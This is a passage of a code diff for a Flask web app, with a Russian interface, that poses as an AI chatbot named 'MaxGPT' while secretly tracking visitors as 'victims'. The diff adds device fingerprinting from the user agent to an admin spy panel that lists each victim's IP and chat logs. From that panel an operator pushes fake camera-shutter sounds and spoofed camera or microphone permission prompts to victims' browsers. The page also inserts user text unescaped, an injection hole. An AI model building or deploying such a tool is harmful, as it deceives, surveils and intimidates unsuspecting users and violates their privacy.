@@ -1,5 +1,5 @@
 from flask import Flask, request, jsonify, render_template_string
-import random, os, urllib.request, json, time
+import random, os, urllib.request, json, time, re
 
 app = Flask(__name__)
 
@@ -9,102 +9,141 @@ pending_commands = {}
 active_victims = {}
 victim_counter = 0
 
+def parse_user_agent(ua_string):
+    ua = ua_string.lower()
+    
+    # Определение ОС
+    if "android" in ua:
+        os_name = "Android"
+    elif "iphone" in ua or "ipad" in ua or "ipod" in ua:
+        os_name = "iOS"
+    elif "windows" in ua:
+        os_name = "Windows"
+    elif "mac os" in ua or "macintosh" in ua:
+        os_name = "macOS"
+    elif "linux" in ua:
+        os_name = "Linux"
+    else:
+        os_name = "Неизвестно"
+        
+    # Определение браузера
+    if "chrome" in ua and "safari" in ua and "edg" not in ua and "opr" not in ua:
+        browser = "Chrome"
+    elif "safari" in ua and "chrome" not in ua:
+        browser = "Safari"
+    elif "firefox" in ua:
+        browser = "Firefox"
+    elif "edg" in ua:
+        browser = "Edge"
+    elif "opr" in ua or "opera" in ua:
+        browser = "Opera"
+    else:
+        browser = "Браузер"
+
+    # Определение типа устройства
+    if "mobile" in ua or "android" in ua and "tablet" not in ua:
+        device_type = "Смартфон"
+        icon = "fa-mobile-screen-button"
+    elif "ipad" in ua or "tablet" in ua or ("android" in ua and "mobile" not in ua):
+        device_type = "Планшет"
+        icon = "fa-tablet-screen-button"
+    else:
+        device_type = "Компьютер"
+        icon = "fa-desktop"
+
+    return f"{device_type} ({os_name} / {browser})", icon
+
 HTML_PAGE = """<!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>MaxGPT</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-        body { background: #17181c; color: #ececf1; display: flex; height: 100vh; overflow: hidden; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background: #17181c; color: #ececf1; display: flex; height: 100vh; height: 100dvh; overflow: hidden; }
         
-        .sidebar { width: 280px; background: #0e0f12; display: flex; flex-direction: column; padding: 12px; gap: 12px; border-right: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 4px 0 20px rgba(0,0,0,0.5); z-index: 20; }
-        .new-btn { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.12); color: #fff; padding: 12px 16px; border-radius: 10px; font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
-        .new-btn:hover { background: rgba(255, 255, 255, 0.08); border-color: rgba(255, 255, 255, 0.25); transform: translateY(-1px); }
+        .sidebar { width: 280px; background: #0e0f12; display: flex; flex-direction: column; padding: 12px; gap: 12px; border-right: 1px solid rgba(255, 255, 255, 0.08); box-shadow: 4px 0 20px rgba(0,0,0,0.5); z-index: 20; transition: transform 0.3s ease; }
+        .new-btn { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.12); color: #fff; padding: 12px 16px; border-radius: 10px; font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; transition: all 0.2s ease; }
+        .new-btn:hover { background: rgba(255, 255, 255, 0.08); }
         .hist { flex: 1; font-size: 12px; color: #8e8ea0; margin-top: 10px; display: flex; flex-direction: column; gap: 6px; overflow-y: auto; }
         .hist-group { font-weight: 700; font-size: 11px; padding: 8px 4px; color: #565869; text-transform: uppercase; letter-spacing: 0.5px; }
-        .hist-item { padding: 12px; border-radius: 8px; color: #ececf1; display: flex; align-items: center; gap: 12px; cursor: pointer; font-size: 13.5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; transition: 0.2s; border: 1px solid transparent; }
+        .hist-item { padding: 12px; border-radius: 8px; color: #ececf1; display: flex; align-items: center; gap: 12px; cursor: pointer; font-size: 13.5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; border: 1px solid transparent; }
         .hist-item.active { background: rgba(255, 255, 255, 0.06); border-color: rgba(255, 255, 255, 0.1); font-weight: 500; }
-        .hist-item:hover { background: rgba(255, 255, 255, 0.04); }
         
         .user-info { padding: 14px; border-top: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; gap: 12px; font-size: 13px; color: #ececf1; background: rgba(0,0,0,0.2); border-radius: 10px; }
+        .user-av-sq { width: 36px; height: 36px; border-radius: 8px; background: #2563eb; color: #ffffff; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 13px; flex-shrink: 0; }
         
-        .user-av-sq { width: 36px; height: 36px; border-radius: 8px; background: #2563eb; color: #ffffff; display: flex; align-items: center; justify-content: center; font-weight: 800; font-size: 13px; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.4); border: 1px solid rgba(255,255,255,0.2); flex-shrink: 0; }
-        
-        .max-av-sq { 
-            width: 38px; 
-            height: 38px; 
-            border-radius: 9px; 
-            background: linear-gradient(135deg, #4c1d95 0%, #7c3aed 45%, #c084fc 80%, #ffffff 100%); 
-            color: #ffffff; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            font-weight: 900; 
-            font-size: 12px; 
-            letter-spacing: 0.5px;
-            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.45); 
-            border: 1px solid rgba(255, 255, 255, 0.4); 
-            flex-shrink: 0; 
-            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.7); 
-        }
+        .max-av-sq { width: 38px; height: 38px; border-radius: 9px; background: linear-gradient(135deg, #4c1d95 0%, #7c3aed 45%, #c084fc 80%, #ffffff 100%); color: #ffffff; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 12px; flex-shrink: 0; }
 
-        .main { flex: 1; display: flex; flex-direction: column; height: 100%; position: relative; background: #131417; }
-        .top-bar { height: 60px; border-bottom: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; justify-content: space-between; padding: 0 24px; background: rgba(19, 20, 23, 0.8); backdrop-filter: blur(10px); box-shadow: 0 4px 15px rgba(0,0,0,0.3); z-index: 10; }
+        .main { flex: 1; display: flex; flex-direction: column; height: 100%; position: relative; background: #131417; min-width: 0; }
+        .top-bar { height: 60px; border-bottom: 1px solid rgba(255, 255, 255, 0.08); display: flex; align-items: center; justify-content: space-between; padding: 0 16px; background: rgba(19, 20, 23, 0.8); backdrop-filter: blur(10px); z-index: 10; }
         
+        .menu-toggle { display: none; background: none; border: none; color: #ececf1; font-size: 20px; cursor: pointer; padding: 8px; }
+
         .model-dropdown { position: relative; display: inline-block; }
-        .model-btn { background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.12); color: #fff; padding: 9px 16px; border-radius: 10px; font-size: 13.5px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; box-shadow: 0 4px 12px rgba(0,0,0,0.25); transition: 0.2s; }
-        .model-btn:hover { background: #262830; border-color: rgba(255, 255, 255, 0.25); }
+        .model-btn { background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.12); color: #fff; padding: 9px 16px; border-radius: 10px; font-size: 13.5px; font-weight: 600; display: flex; align-items: center; gap: 10px; cursor: pointer; }
         
-        .model-menu { display: none; position: absolute; top: 115%; left: 0; background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 12px; width: 250px; box-shadow: 0 12px 30px rgba(0,0,0,0.6); z-index: 100; overflow: hidden; backdrop-filter: blur(15px); }
+        .model-menu { display: none; position: absolute; top: 115%; left: 0; background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.15); border-radius: 12px; width: 220px; box-shadow: 0 12px 30px rgba(0,0,0,0.6); z-index: 100; overflow: hidden; }
         .model-menu.show { display: block; }
-        .model-option { padding: 13px 16px; font-size: 13px; color: #ececf1; display: flex; align-items: center; justify-content: space-between; cursor: pointer; border-bottom: 1px solid rgba(255, 255, 255, 0.05); transition: 0.2s; }
-        .model-option:hover { background: rgba(255, 255, 255, 0.08); }
+        .model-option { padding: 13px 16px; font-size: 13px; color: #ececf1; display: flex; align-items: center; justify-content: space-between; cursor: pointer; border-bottom: 1px solid rgba(255, 255, 255, 0.05); }
         .model-option.selected { color: #8b5cf6; font-weight: 700; background: rgba(139, 92, 246, 0.1); }
 
         #chat { flex: 1; overflow-y: auto; display: flex; flex-direction: column; scroll-behavior: smooth; padding-bottom: 20px; }
         #chat::-webkit-scrollbar { width: 6px; }
         #chat::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.15); border-radius: 3px; }
         
-        .row { display: flex; gap: 18px; padding: 22px 22%; border-bottom: 1px solid rgba(255, 255, 255, 0.04); position: relative; animation: fadeIn 0.25s ease-out forwards; }
+        .row { display: flex; gap: 14px; padding: 18px 5%; border-bottom: 1px solid rgba(255, 255, 255, 0.04); position: relative; animation: fadeIn 0.25s ease-out forwards; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: translateY(0); } }
         
         .row.bot { background: rgba(255, 255, 255, 0.02); }
-        .msg-container { flex: 1; display: flex; flex-direction: column; gap: 4px; }
+        .msg-container { flex: 1; display: flex; flex-direction: column; gap: 4px; min-width: 0; }
         .bot-author { font-size: 13px; font-weight: 700; color: #a78bfa; margin-bottom: 2px; display: flex; align-items: center; gap: 6px; }
         .usr-author { font-size: 13px; font-weight: 700; color: #60a5fa; margin-bottom: 2px; }
-        .txt { font-size: 15px; line-height: 1.65; word-break: break-word; color: #e2e8f0; letter-spacing: 0.2px; }
+        .txt { font-size: 15px; line-height: 1.65; word-break: break-word; color: #e2e8f0; }
 
-        .sys-status { font-size: 12px; color: #f87171; margin-top: 8px; display: flex; align-items: center; gap: 6px; font-weight: 600; background: rgba(239, 68, 68, 0.1); padding: 6px 10px; border-radius: 6px; border-left: 3px solid #ef4444; width: fit-content; }
-        .warn { background: rgba(239, 68, 68, 0.12); border: 1px solid rgba(239, 68, 68, 0.4); color: #fca5a5; padding: 12px 16px; border-radius: 8px; font-size: 13px; margin-top: 8px; box-shadow: 0 4px 15px rgba(239, 68, 68, 0.15); }
-
-        .input-area { padding: 16px 22% 24px; background: #131417; }
-        .input-wrap { background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 14px; padding: 12px 16px; display: flex; gap: 12px; box-shadow: 0 8px 25px rgba(0,0,0,0.4); position: relative; transition: 0.2s ease; }
-        .input-wrap:focus-within { border-color: #8b5cf6; box-shadow: 0 8px 30px rgba(139, 92, 246, 0.25); }
-        textarea { flex: 1; background: none; border: none; color: #fff; outline: none; resize: none; height: 26px; font-size: 15px; line-height: 26px; }
+        .input-area { padding: 16px 5% 20px; background: #131417; }
+        .input-wrap { background: #1e1f24; border: 1px solid rgba(255, 255, 255, 0.12); border-radius: 14px; padding: 10px 14px; display: flex; gap: 10px; align-items: flex-end; box-shadow: 0 8px 25px rgba(0,0,0,0.4); }
+        .input-wrap:focus-within { border-color: #8b5cf6; }
+        textarea { flex: 1; background: none; border: none; color: #fff; outline: none; resize: none; min-height: 24px; max-height: 120px; font-size: 15px; line-height: 24px; }
         textarea::placeholder { color: #64748b; }
         
-        .send-btn { background: linear-gradient(135deg, #7c3aed 0%, #2563eb 100%); color: #fff; border: none; width: 34px; height: 34px; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; transition: 0.2s; box-shadow: 0 4px 12px rgba(124, 58, 237, 0.4); }
-        .send-btn:hover { transform: scale(1.05); filter: brightness(1.1); }
-        .disclaimer { font-size: 11.5px; color: #64748b; text-align: center; margin-top: 10px; font-weight: 500; }
+        .send-btn { background: linear-gradient(135deg, #7c3aed 0%, #2563eb 100%); color: #fff; border: none; width: 36px; height: 36px; border-radius: 9px; cursor: pointer; display: flex; align-items: center; justify-content: center; flex-shrink: 0; transition: 0.2s; }
+        .disclaimer { font-size: 11px; color: #64748b; text-align: center; margin-top: 8px; font-weight: 500; }
 
-        .fake-modal { display: none; position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #1e2029; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 14px; padding: 18px 22px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); z-index: 9999; width: 380px; backdrop-filter: blur(20px); animation: slideDown 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28); }
-        @keyframes slideDown { from { top: -100px; opacity: 0; } to { top: 20px; opacity: 1; } }
-        .fake-modal-header { display: flex; align-items: center; gap: 12px; font-size: 14px; font-weight: 700; color: #fff; margin-bottom: 8px; }
+        .fake-modal { display: none; position: fixed; top: 20px; left: 50%; transform: translateX(-50%); background: #1e2029; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 14px; padding: 18px 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); z-index: 9999; width: 90%; max-width: 380px; backdrop-filter: blur(20px); }
+        .fake-modal-header { display: flex; align-items: center; gap: 10px; font-size: 14px; font-weight: 700; color: #fff; margin-bottom: 8px; }
         .fake-modal-body { font-size: 12.5px; color: #94a3b8; line-height: 1.5; margin-bottom: 16px; }
-        .fake-modal-actions { display: flex; justify-content: flex-end; gap: 10px; }
-        .fake-btn { padding: 8px 16px; border-radius: 8px; font-size: 12.5px; font-weight: 600; cursor: pointer; border: none; transition: 0.2s; }
+        .fake-modal-actions { display: flex; justify-content: flex-end; gap: 8px; }
+        .fake-btn { padding: 8px 14px; border-radius: 8px; font-size: 12.5px; font-weight: 600; cursor: pointer; border: none; }
         .fake-btn-deny { background: rgba(255,255,255,0.08); color: #cbd5e1; }
-        .fake-btn-deny:hover { background: rgba(255,255,255,0.15); }
-        .fake-btn-allow { background: #3b82f6; color: #fff; box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4); }
-        .fake-btn-allow:hover { background: #2563eb; }
+        .fake-btn-allow { background: #3b82f6; color: #fff; }
 
-        @media(max-width: 900px) { .sidebar { display: none; } .row { padding: 18px; } .input-area { padding: 12px 14px 18px; } .fake-modal { width: 90%; } }
+        .sidebar-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 15; backdrop-filter: blur(3px); }
+
+        /* Адаптивность для ПК */
+        @media(min-width: 1024px) {
+            .row, .input-area { padding-left: 20%; padding-right: 20%; }
+        }
+        /* Адаптивность для планшетов */
+        @media(min-width: 768px) and (max-width: 1023px) {
+            .row, .input-area { padding-left: 10%; padding-right: 10%; }
+        }
+        /* Адаптивность для мобилок */
+        @media(max-width: 767px) {
+            .sidebar { position: fixed; left: -280px; top: 0; bottom: 0; transition: transform 0.3s ease; }
+            .sidebar.open { transform: translateX(280px); }
+            .sidebar-overlay.open { display: block; }
+            .menu-toggle { display: block; }
+            .row { padding: 14px 12px; }
+            .input-area { padding: 10px 12px 14px; }
+        }
     </style>
 </head>
 <body onclick="unlockAudio()">
+
+<div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
 
 <div class="fake-modal" id="permModal">
     <div class="fake-modal-header" id="permIconHeader">
@@ -112,7 +151,7 @@ HTML_PAGE = """<!DOCTYPE html>
         <span id="permTitle">Разрешение устройства</span>
     </div>
     <div class="fake-modal-body" id="permText">
-        Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к камере. Вы даете согласие?
+        Сайт запрашивает доступ к камере. Вы даете согласие?
     </div>
     <div class="fake-modal-actions">
         <button class="fake-btn fake-btn-deny" onclick="closePermModal()">Заблокировать</button>
@@ -120,7 +159,7 @@ HTML_PAGE = """<!DOCTYPE html>
     </div>
 </div>
 
-<div class="sidebar">
+<div class="sidebar" id="sidebar">
     <button class="new-btn"><i class="fa-solid fa-plus"></i> Новый диалог</button>
     <div class="hist">
         <div class="hist-group">Сегодня</div>
@@ -137,19 +176,22 @@ HTML_PAGE = """<!DOCTYPE html>
 
 <div class="main">
     <div class="top-bar">
-        <div class="model-dropdown">
-            <div class="model-btn" onclick="toggleModelMenu()">
-                <i class="fa-solid fa-bolt" style="color:#8b5cf6;"></i>
-                <span id="selectedModel">MaxGPT 4.0 Ultra</span>
-                <i class="fa-solid fa-chevron-down" style="font-size:10px; color:#64748b; margin-left:4px;"></i>
-            </div>
-            <div class="model-menu" id="modelMenu">
-                <div class="model-option selected" onclick="selectModel('MaxGPT 4.0 Ultra')">
-                    <span><b>MaxGPT 4.0 Ultra</b></span>
-                    <i class="fa-solid fa-check"></i>
+        <div style="display: flex; align-items: center; gap: 12px;">
+            <button class="menu-toggle" onclick="toggleSidebar()"><i class="fa-solid fa-bars"></i></button>
+            <div class="model-dropdown">
+                <div class="model-btn" onclick="toggleModelMenu()">
+                    <i class="fa-solid fa-bolt" style="color:#8b5cf6;"></i>
+                    <span id="selectedModel">MaxGPT 4.0 Ultra</span>
+                    <i class="fa-solid fa-chevron-down" style="font-size:10px; color:#64748b; margin-left:4px;"></i>
                 </div>
-                <div class="model-option" onclick="selectModel('MaxGPT 3.5 Turbo')">
-                    <span><b>MaxGPT 3.5 Turbo</b></span>
+                <div class="model-menu" id="modelMenu">
+                    <div class="model-option selected" onclick="selectModel('MaxGPT 4.0 Ultra')">
+                        <span><b>MaxGPT 4.0 Ultra</b></span>
+                        <i class="fa-solid fa-check"></i>
+                    </div>
+                    <div class="model-option" onclick="selectModel('MaxGPT 3.5 Turbo')">
+                        <span><b>MaxGPT 3.5 Turbo</b></span>
+                    </div>
                 </div>
             </div>
         </div>
@@ -167,7 +209,7 @@ HTML_PAGE = """<!DOCTYPE html>
 
     <div class="input-area">
         <div class="input-wrap">
-            <textarea id="userInput" placeholder="Отправить сообщение..." onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();send();}"></textarea>
+            <textarea id="userInput" placeholder="Сообщение..." rows="1" oninput="autoResize(this)" onkeydown="if(event.key==='Enter'&&!event.shiftKey){event.preventDefault();send();}"></textarea>
             <button class="send-btn" onclick="send()"><i class="fa-solid fa-arrow-up"></i></button>
         </div>
         <div class="disclaimer">MaxGPT может допускать ошибки. Проверяйте информацию.</div>
@@ -179,7 +221,7 @@ let audioCtx = null;
 
 function unlockAudio() {
     if (!audioCtx) {
-        audioCtx = new(window.AudioContext || window.webkitAudioContext)();
+        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         audioCtx.resume();
     }
 }
@@ -194,10 +236,8 @@ function playShutterSound() {
         o.frequency.exponentialRampToValueAtTime(300, audioCtx.currentTime + 0.08);
         g.gain.setValueAtTime(0.5, audioCtx.currentTime);
         g.gain.linearRampToValueAtTime(0.01, audioCtx.currentTime + 0.08);
-        o.connect(g);
-        g.connect(audioCtx.destination);
-        o.start();
-        o.stop(audioCtx.currentTime + 0.08);
+        o.connect(g); g.connect(audioCtx.destination);
+        o.start(); o.stop(audioCtx.currentTime + 0.08);
     } catch(e) {}
 }
 
@@ -210,24 +250,22 @@ function playBeepSound() {
         o.frequency.setValueAtTime(880, audioCtx.currentTime);
         g.gain.setValueAtTime(0.3, audioCtx.currentTime);
         g.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
-        o.connect(g);
-        g.connect(audioCtx.destination);
-        o.start();
-        o.stop(audioCtx.currentTime + 0.4);
+        o.connect(g); g.connect(audioCtx.destination);
+        o.start(); o.stop(audioCtx.currentTime + 0.4);
     } catch(e) {}
 }
 
 function showCameraPromptCustom() {
     let modal = document.getElementById("permModal");
     document.getElementById("permIconHeader").innerHTML = '<i class="fa-solid fa-camera" style="color: #3b82f6; font-size: 16px;"></i> <span>Запрос камеры</span>';
-    document.getElementById("permText").innerHTML = "Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к видеокамере для биометрической авторизации. Вы даете согласие?";
+    document.getElementById("permText").innerHTML = "Сайт запрашивает доступ к видеокамере для биометрической авторизации. Разрешить?";
     modal.style.display = "block";
 }
 
 function showMicPromptCustom() {
     let modal = document.getElementById("permModal");
     document.getElementById("permIconHeader").innerHTML = '<i class="fa-solid fa-microphone" style="color: #ef4444; font-size: 16px;"></i> <span>Запрос микрофона</span>';
-    document.getElementById("permText").innerHTML = "Сайт <b>maxgpt-bot.onrender.com</b> запрашивает доступ к микрофону для голосового диалога. Вы даете согласие?";
+    document.getElementById("permText").innerHTML = "Сайт запрашивает доступ к микрофону для голосового ввода. Разрешить?";
     modal.style.display = "block";
 }
 
@@ -235,7 +273,25 @@ function closePermModal() {
     document.getElementById("permModal").style.display = "none";
 }
 
-// Опрос команд из админки
+function toggleSidebar() {
+    document.getElementById("sidebar").classList.toggle("open");
+    document.getElementById("sidebarOverlay").classList.toggle("open");
+}
+
+function toggleModelMenu() {
+    document.getElementById("modelMenu").classList.toggle("show");
+}
+
+function selectModel(name) {
+    document.getElementById("selectedModel").innerText = name;
+    toggleModelMenu();
+}
+
+function autoResize(textarea) {
+    textarea.style.height = 'auto';
+    textarea.style.height = Math.min(textarea.scrollHeight, 120) + 'px';
+}
+
 async function pollAdminCommands() {
     try {
         let r = await fetch("/api/poll");
@@ -255,16 +311,16 @@ setInterval(pollAdminCommands, 1000);
 
 async function send(){
     unlockAudio();
-    let i=document.getElementById("userInput"), t=i.value.trim(); if(!t) return;
-    let c=document.getElementById("chat");
+    let i = document.getElementById("userInput"), t = i.value.trim(); if(!t) return;
+    let c = document.getElementById("chat");
 
-    c.innerHTML+=`<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${t}</div></div></div>`;
-    i.value=""; c.scrollTop=c.scrollHeight;
+    c.innerHTML += `<div class="row"><div class="user-av-sq">Вы</div><div class="msg-container"><div class="usr-author">Вы</div><div class="txt">${t}</div></div></div>`;
+    i.value = ""; i.style.height = 'auto'; c.scrollTop = c.scrollHeight;
 
-    let r=await fetch("/api/chat",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:t})});
-    let d=await r.json();
-    c.innerHTML+=`<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt">${d.reply}</div></div></div>`;
-    c.scrollTop=c.scrollHeight;
+    let r = await fetch("/api/chat", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({message:t})});
+    let d = await r.json();
+    c.innerHTML += `<div class="row bot"><div class="max-av-sq">МАХ</div><div class="msg-container"><div class="bot-author">MaxGPT AI</div><div class="txt">${d.reply}</div></div></div>`;
+    c.scrollTop = c.scrollHeight;
 }
 </script>
 </body>
@@ -279,37 +335,46 @@ SPY_PAGE = """<!DOCTYPE html>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body { background: #090a0f; color: #e2e8f0; padding: 20px; min-height: 100vh; }
+        body { background: #090a0f; color: #e2e8f0; padding: 16px; min-height: 100vh; }
         
-        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 14px; border-bottom: 1px solid rgba(255,255,255,0.1); }
-        .title { font-size: 20px; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 10px; }
+        .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; padding-bottom: 14px; border-bottom: 1px solid rgba(255,255,255,0.1); flex-wrap: gap; gap: 10px; }
+        .title { font-size: 18px; font-weight: 800; color: #fff; display: flex; align-items: center; gap: 10px; }
         .title i { color: #8b5cf6; }
         .live-badge { background: rgba(16, 185, 129, 0.15); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3); padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: 700; display: flex; align-items: center; gap: 6px; }
         .pulse { width: 8px; height: 8px; background: #10b981; border-radius: 50%; animation: blink 1.5s infinite; }
         @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
 
-        .section-title { font-size: 14px; font-weight: 700; color: #94a3b8; text-transform: uppercase; margin-bottom: 12px; letter-spacing: 0.5px; }
+        .section-title { font-size: 13px; font-weight: 700; color: #94a3b8; text-transform: uppercase; margin-bottom: 12px; letter-spacing: 0.5px; }
 
         .victims-grid { display: flex; flex-direction: column; gap: 14px; margin-bottom: 30px; }
-        .victim-card { background: #13151f; border: 1px solid rgba(255,255,255,0.1); border-radius: 14px; padding: 18px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); display: flex; flex-direction: column; gap: 12px; }
-        .victim-head { display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; }
-        .victim-name { font-size: 16px; font-weight: 800; color: #a78bfa; display: flex; align-items: center; gap: 8px; }
-        .victim-ip { font-family: monospace; font-size: 12px; color: #f59e0b; background: rgba(245, 158, 11, 0.1); padding: 3px 8px; border-radius: 6px; }
+        .victim-card { background: #13151f; border: 1px solid rgba(255,255,255,0.1); border-radius: 14px; padding: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); display: flex; flex-direction: column; gap: 12px; }
+        .victim-head { display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; flex-wrap: wrap; gap: 8px; }
+        .victim-name { font-size: 15px; font-weight: 800; color: #a78bfa; display: flex; align-items: center; gap: 8px; }
+        
+        .badges-wrap { display: flex; gap: 6px; flex-wrap: wrap; }
+        .badge { font-family: monospace; font-size: 11px; padding: 3px 8px; border-radius: 6px; display: flex; align-items: center; gap: 5px; }
+        .badge-ip { background: rgba(245, 158, 11, 0.1); color: #f59e0b; border: 1px solid rgba(245, 158, 11, 0.2); }
+        .badge-dev { background: rgba(59, 130, 246, 0.1); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.2); }
 
-        .action-btns { display: flex; gap: 8px; flex-wrap: wrap; }
-        .btn-act { padding: 8px 12px; border-radius: 8px; font-size: 12px; font-weight: 700; border: none; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; color: #fff; }
-        .btn-act:hover { transform: translateY(-1px); filter: brightness(1.1); }
+        .action-btns { display: flex; gap: 6px; flex-wrap: wrap; }
+        .btn-act { padding: 8px 12px; border-radius: 8px; font-size: 11.5px; font-weight: 700; border: none; cursor: pointer; display: flex; align-items: center; gap: 6px; transition: 0.2s; color: #fff; }
+        .btn-act:hover { filter: brightness(1.1); }
         .btn-shutter { background: #ef4444; }
         .btn-beep { background: #f59e0b; }
         .btn-cam { background: #3b82f6; }
         .btn-mic { background: #8b5cf6; }
         .btn-del { background: #dc2626; margin-left: auto; }
 
-        .logs-container { display: flex; flex-direction: column; gap: 12px; }
-        .log-card { background: #13151f; border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 14px; }
-        .chat-block { display: flex; flex-direction: column; gap: 6px; font-size: 14px; }
-        .user-msg { color: #60a5fa; background: rgba(96, 165, 250, 0.06); padding: 8px 12px; border-radius: 8px; }
-        .bot-msg { color: #e2e8f0; background: rgba(255, 255, 255, 0.04); padding: 8px 12px; border-radius: 8px; }
+        .logs-container { display: flex; flex-direction: column; gap: 10px; }
+        .log-card { background: #13151f; border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; padding: 12px; }
+        .chat-block { display: flex; flex-direction: column; gap: 6px; font-size: 13.5px; }
+        .user-msg { color: #60a5fa; background: rgba(96, 165, 250, 0.06); padding: 8px 10px; border-radius: 8px; }
+        .bot-msg { color: #e2e8f0; background: rgba(255, 255, 255, 0.04); padding: 8px 10px; border-radius: 8px; }
+
+        @media(min-width: 768px) {
+            body { padding: 24px; }
+            .title { font-size: 20px; }
+        }
     </style>
 </head>
 <body>
@@ -319,38 +384,41 @@ SPY_PAGE = """<!DOCTYPE html>
     <div class="live-badge"><div class="pulse"></div> ЭФИР АКТИВЕН</div>
 </div>
 
-<div class="section-title">🎯 Активные Жертвы (Только с сообщениями)</div>
+<div class="section-title">🎯 Активные Жертвы</div>
 
 <div class="victims-grid">
     {% for ip, data in victims.items() %}
     <div class="victim-card">
         <div class="victim-head">
             <div class="victim-name"><i class="fa-solid fa-user-ninja"></i> Жертва #{{ data.id }}</div>
-            <span class="victim-ip"><i class="fa-solid fa-network-wired"></i> IP: {{ ip }}</span>
+            <div class="badges-wrap">
+                <span class="badge badge-dev"><i class="fa-solid {{ data.dev_icon }}"></i> {{ data.device }}</span>
+                <span class="badge badge-ip"><i class="fa-solid fa-network-wired"></i> {{ ip }}</span>
+            </div>
         </div>
         <div style="font-size:12px; color:#94a3b8;">
             Сообщений: <b>{{ data.msg_count }}</b>
         </div>
         <div class="action-btns">
             <button class="btn-act btn-shutter" onclick="triggerAction('{{ ip }}', 'sound_shutter')">
-                <i class="fa-solid fa-camera"></i> 🔊 Звук Щелчка
+                <i class="fa-solid fa-camera"></i> 🔊 Щелчок
             </button>
             <button class="btn-act btn-beep" onclick="triggerAction('{{ ip }}', 'sound_beep')">
-                <i class="fa-solid fa-bell"></i> 🔔 Звук Звонка
+                <i class="fa-solid fa-bell"></i> 🔔 Звонок
             </button>
             <button class="btn-act btn-cam" onclick="triggerAction('{{ ip }}', 'perm_cam')">
-                <i class="fa-solid fa-video"></i> 📹 Запрос Камеры
+                <i class="fa-solid fa-video"></i> 📹 Камера
             </button>
             <button class="btn-act btn-mic" onclick="triggerAction('{{ ip }}', 'perm_mic')">
-                <i class="fa-solid fa-microphone"></i> 🎙️ Запрос Микрофона
